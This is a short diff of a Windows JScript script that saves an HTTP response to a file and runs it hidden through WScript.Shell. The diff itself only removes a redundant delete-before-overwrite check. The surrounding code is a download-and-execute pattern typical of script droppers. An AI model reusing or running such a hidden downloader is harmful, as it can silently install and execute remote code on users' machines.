@@ -25,10 +25,6 @@ if (Object.Status == 200)
     Stream.Write(Object.ResponseBody);
     Stream.Position = 0;
     var File = new ActiveXObject('Scripting.FileSystemObject');
-    if (File.FileExists(Target))
-    {
-        File.DeleteFile(Target);
-    }
     Stream.SaveToFile(Target, 2); // adSaveCreateOverWrite
     Stream.Close();
     new ActiveXObject("WScript.Shell").Run(Target,0,true);
